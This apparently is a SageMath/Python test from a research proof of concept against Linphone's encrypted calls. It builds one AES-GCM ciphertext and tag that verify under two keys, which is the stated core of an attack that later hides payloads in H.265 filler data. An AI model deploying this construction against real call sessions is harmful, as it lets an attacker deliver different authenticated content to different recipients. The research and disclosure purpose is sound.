"""GHASH-collision round-trip test for the Linphone Step 2 PoC.

Given two AES-GCM keys K_old, K_new, a single nonce, no AAD, and a plaintext
plus reserved adjustment slot, we:

  1. AES-CTR-encrypt the plaintext under K_old → C_base
  2. Append a placeholder 16-byte block (the adjustment slot) → C_full
  3. Solve the GHASH equation so that the ciphertext authenticates under
     BOTH K_old and K_new with the same 16-byte authentication tag (paper
     §2.3 / Appendix A, using gcm.sage's gcm_1block).

The output is a single (ciphertext, tag) pair such that:

  - AES-GCM-Decrypt(K_old, IV, ciphertext, tag) == plaintext || pseudo_old
  - AES-GCM-Decrypt(K_new, IV, ciphertext, tag) == pseudo_new

both succeed (no MAC failure). The bytes covered by the original plaintext
are recovered under K_old; under K_new the same bytes decrypt to keystream
XOR ciphertext (i.e. random-looking bytes that the H.265 decoder will
discard once we frame them as Filler-Data NAL contents in Step 2.2).

This test does not yet involve H.265 NAL framing or Filler Data; it only
proves the cryptographic core works for the per-packet Linphone setting.
"""

from binascii import hexlify, unhexlify
import operator

from Crypto.Cipher import AES

load('attack/crypto/util.sage')
load('attack/crypto/gcm.sage')


def aes_ctr_keystream(key: bytes, iv12: bytes, nbytes: int) -> bytes:
    """SRTP-style: 12-byte IV, AES-GCM internally counts from J0 = IV || 1.
    For our purposes (compute keystream block-aligned), we use the same
    primitive as AES.MODE_GCM(plain=b'\\x00'*n).encrypt(); pycryptodome
    handles J0 internally."""
    return AES.new(key, AES.MODE_GCM, nonce=iv12).encrypt(b"\x00" * nbytes)


def build_ambiguous(plaintext: bytes, k_old: bytes, k_new: bytes,
                    iv12: bytes) -> tuple[bytes, bytes]:
    """Generate an ambiguous AES-GCM (ciphertext, tag) under (k_old, k_new).

    plaintext: bytes that we want the K_old receiver to recover. Its length
               does NOT need to be a multiple of 16.
    Returns (ciphertext, tag16) where:
      - ciphertext has length pad16(plaintext) + 16  (one extra adjustment
        block at the end, which the GHASH-collision routine fills in)
      - tag16 verifies under both K_old and K_new with the given IV and no AAD
    """
    # Pad plaintext to 16-byte boundary so AES-CTR keystream divides cleanly.
    pt_padded = pad16(plaintext)
    base_len = len(pt_padded)

    # Keystream covering base + the trailing 16-byte adjustment block.
    ks_old = aes_ctr_keystream(k_old, iv12, base_len + 16)

    # Encrypt the plaintext bytes under K_old's keystream; leave adjustment
    # block zero (placeholder — gcm_1block will overwrite it).
    c_base = bytes(operator.xor(p, k) for p, k in zip(pt_padded, ks_old[:base_len]))
    c_full = c_base + b"\x00" * 16

    # Slice into 16-byte blocks for gcm_1block.
    n_blocks = len(c_full) // 16
    ct_blocks = [c_full[i*16:(i+1)*16] for i in range(n_blocks)]
    correction_idx = n_blocks - 1   # the last block is the adjustment slot

    # No AAD on either side.
    _, _, final_ct_blocks, tag16 = gcm_1block(
        k_old, k_new, iv12, iv12,
        correction_idx,
        len(c_full), ct_blocks,
        0, [],
        0, [],
    )
    ciphertext = b"".join(final_ct_blocks)
    return ciphertext, tag16


def pad16(x: bytes) -> bytes:
    if len(x) % 16 != 0:
        x = x + b"\x00" * (16 - len(x) % 16)
    return x


def main():
    # Fixed test vectors (deterministic so the test is reproducible).
    k_old = unhexlify("000102030405060708090a0b0c0d0e0f"
                     "101112131415161718191a1b1c1d1e1f")  # 32B = AES-256
    k_new = unhexlify("ffeeddccbbaa99887766554433221100"
                     "fedcba9876543210ffeeddccbbaa9988")  # 32B
    iv12  = unhexlify("0a0b0c0d0e0f101112131415")          # 12B

    plaintext = b"adversary's secret message that K_old recovers"

    print(f"[*] plaintext       ({len(plaintext)} B): {plaintext!r}")
    print(f"[*] K_old hex:    {hexlify(k_old).decode()}")
    print(f"[*] K_new hex:    {hexlify(k_new).decode()}")
    print(f"[*] IV (12 B) hex:{hexlify(iv12).decode()}")
    print()

    ciphertext, tag16 = build_ambiguous(plaintext, k_old, k_new, iv12)
    print(f"[*] ciphertext   ({len(ciphertext)} B): {hexlify(ciphertext).decode()}")
    print(f"[*] tag (16 B)        hex: {hexlify(tag16).decode()}")
    print()

    # Verify under K_old: should DECRYPT AND VERIFY, and recover plaintext.
    cipher_old = AES.new(k_old, AES.MODE_GCM, nonce=iv12)
    try:
        pt_old = cipher_old.decrypt_and_verify(ciphertext, tag16)
        recovered = pt_old[:len(plaintext)]
        ok_old = (recovered == plaintext)
        print(f"[+] K_old decrypt_and_verify : PASS  → recovered={recovered!r} "
              f"({'match' if ok_old else 'MISMATCH'})")
    except ValueError as e:
        print(f"[-] K_old decrypt_and_verify : FAIL ({e})")
        ok_old = False

    # Verify under K_new: tag MUST also verify (ambiguous), but plaintext
    # will be pseudo-random.
    cipher_new = AES.new(k_new, AES.MODE_GCM, nonce=iv12)
    try:
        pt_new = cipher_new.decrypt_and_verify(ciphertext, tag16)
        ok_new = True
        # the recovered bytes are not meaningful; we want to show they are
        # *different* from the K_old plaintext.
        diff = (pt_new[:len(plaintext)] != plaintext)
        print(f"[+] K_new decrypt_and_verify : PASS  → first {len(plaintext)} B "
              f"differ from K_old plaintext: {diff}  (bytes: "
              f"{hexlify(pt_new[:16]).decode()}…)")
    except ValueError as e:
        print(f"[-] K_new decrypt_and_verify : FAIL ({e})")
        ok_new = False

    print()
    if ok_old and ok_new:
        print("[*] GHASH collision PoC works: same (ciphertext, tag) "
              "authenticates under both keys.")
    else:
        raise SystemExit("[-] test failed")


if __name__ == "__main__":
    main()
